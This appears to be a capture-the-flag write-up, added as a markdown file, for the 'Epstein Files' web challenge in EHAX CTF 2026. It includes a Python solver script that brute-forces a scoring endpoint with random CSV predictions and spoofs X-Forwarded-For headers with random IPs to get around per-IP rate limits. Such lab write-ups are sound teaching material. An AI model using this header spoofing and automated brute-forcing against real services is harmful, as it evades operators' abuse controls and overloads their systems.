@@ -1,0 +1,164 @@
+---
+title: 'EHAX CTF 2026 - Epstein Files (Web)'
+description: 'Writeup for Epstein Files from EHAX CTF 2026. A web challenge involving bypassing an AI model accuracy check by brute-forcing predictions and spoofing X-Forwarded-For to bypass rate limits.'
+date: 2026-03-02
+tags: ['writeup', 'web', 'ehax', 'bruteforce']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Category:** Web
+**Points:** 492
+**Target:** `http://chall.ehax.in:4529/`
+**Objective:** Trigger the success page and extract the flag by submitting CSV predictions with exactly an accuracy of `0.69`.
+
+**TL;DR:** The web app accepts `.csv` and `.pkl` submissions. For CSV, it calculates accuracy against a hidden solution and unlocks the flag page when displayed accuracy is exactly **`0.69`**. By generating valid CSV predictions (`2276` rows), bypassing the rate-limit via `X-Forwarded-For`, and brute-forcing submissions near the right class ratio, we trigger the success page and extract the flag.
+
+## 1. Initial Recon
+
+Open challenge page:
+
+```bash
+curl -i -s http://chall.ehax.in:4529/ | sed -n '1,220p'
+```
+
+The page contains:
+- Data download links:
+  - `/data/train.csv`
+  - `/data/test.csv`
+  - `/data/sample_sub.csv`
+- Upload form posting to `/submit`
+- Accepted formats shown in UI: `.csv` or `.pkl`
+
+Download assets:
+
+```bash
+curl -s -o /tmp/train.csv http://chall.ehax.in:4529/data/train.csv
+curl -s -o /tmp/test.csv http://chall.ehax.in:4529/data/test.csv
+curl -s -o /tmp/sample_sub.csv http://chall.ehax.in:4529/data/sample_sub.csv
+wc -l /tmp/train.csv /tmp/test.csv /tmp/sample_sub.csv
+```
+
+**Important finding:**
+`test.csv` has **2276 data rows** (2277 lines including the header).
+
+## 2. Submission Behavior Mapping
+
+### 2.1 CSV Row-Count Validation
+
+Submitting a tiny sample CSV:
+
+```bash
+curl -i -s -X POST -F 'submission=@/tmp/sample_sub.csv' http://chall.ehax.in:4529/submit
+```
+
+Error reveals:
+- `submission has 8 rows, expected 2276`
+
+So valid CSV must have exactly 2276 predictions.
+
+### 2.2 Baseline Accuracy Probes
+
+Submitting all zeros:
+
+```python
+import pandas as pd
+pd.DataFrame({"In Black Book":[0]*2276}).to_csv("/tmp/sub0.csv", index=False)
+```
+
+Uploading this file results in the score page showing:
+- `SUBJECT ACCURACY RATING: 0.73`
+
+Submitting random predictions yields an accuracy around `0.49` (varies).
+Thus, the `/submit` endpoint acts as an oracle returning rounded accuracy.
+
+## 3. Win Condition Discovery
+
+Most responses return a normal evaluation page, but occasionally a different page appears:
+- `<title>Epstein Comp | DECLASSIFIED DATA</title>`
+
+That success page explicitly states:
+- `ACCURACY THRESHOLD // 0.69`
+
+And contains the flag directly in the HTML (inside a "redacted" span).
+
+Therefore, the objective is not to build the "best model," but to hit a displayed accuracy exactly equivalent to **0.69**.
+
+## 4. Practical Exploitation Strategy
+
+### 4.1 Why Brute Force Works
+
+The app compares predicted labels to hidden solution labels and rounds the accuracy to 2 decimals before display. 
+
+Any actual accuracy that rounds to `0.69` unlocks the flag page. This means the target interval is approximately `[0.685, 0.695)`.
+
+Since we only need to submit binary vectors, we can repeatedly sample random predictions until we randomly land inside that interval.
+
+### 4.2 Rate-Limit Bypass
+
+The `/submit` endpoint has per-IP rate limits (`X-RateLimit-*` headers), but the server mistakenly trusts the `X-Forwarded-For` header.
+
+Sending a spoofed header with random IPs for each request grants a fresh quota:
+
+```http
+X-Forwarded-For: 12.34.56.78
+```
+
+This allows us to brute-force the endpoint rapidly without getting blocked.
+
+### 4.3 Effective Search Zone
+
+Empirically, random vectors containing roughly **~200-220 ones** out of 2276 elements frequently produced scores near `0.68-0.70`, making this a small, highly effective target region.
+In my successful run, a vector with exactly `k = 214` ones hit the success page immediately.
+
+## 5. Solver Script (Automated)
+
+We can automate the attack using Python and the `Requests` module.
+
+```python
+import pandas as pd, random, requests, re
+
+url = "http://chall.ehax.in:4529/submit"
+n = 2276
+
+for attempt in range(1, 2000):
+    # Tune around empirically successful range
+    k = random.choice(range(200, 221))
+
+    pred = [0] * n
+    for idx in random.sample(range(n), k):
+        pred[idx] = 1
+
+    path = "/tmp/sub.csv"
+    pd.DataFrame({"In Black Book": pred}).to_csv(path, index=False)
+
+    spoof_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
+    with open(path, "rb") as f:
+        r = requests.post(
+            url,
+            files={"submission": ("sub.csv", f, "text/csv")},
+            headers={"X-Forwarded-For": spoof_ip},
+            timeout=20,
+        )
+
+    # Direct flag capture
+    m = re.search(r"EH4X\{[^}]+\}", r.text)
+    if m:
+        print(f"[+] Attempt {attempt}: {m.group(0)}")
+        break
+
+    # Optional progress output
+    title = re.search(r"<title>(.*?)</title>", r.text, re.S)
+    if title:
+        print(f"[-] Attempt {attempt}: {title.group(1).strip()}")
+```
+
+## 6. Result
+
+Running the automated script quickly triggers the `DECLASSIFIED DATA` page and extracts the flag:
+
+```text
+EH4X{epst3in_d1dnt_k1ll_h1ms3lf_but_th1s_m0d3l_d1d}
+```
